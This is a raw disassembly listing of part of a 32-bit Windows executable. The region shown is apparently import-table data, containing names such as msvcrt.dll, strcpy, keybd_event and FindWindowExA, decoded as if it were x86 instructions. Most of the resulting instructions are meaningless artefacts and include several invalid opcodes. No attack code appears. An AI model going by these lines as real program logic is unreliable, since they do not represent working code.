  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
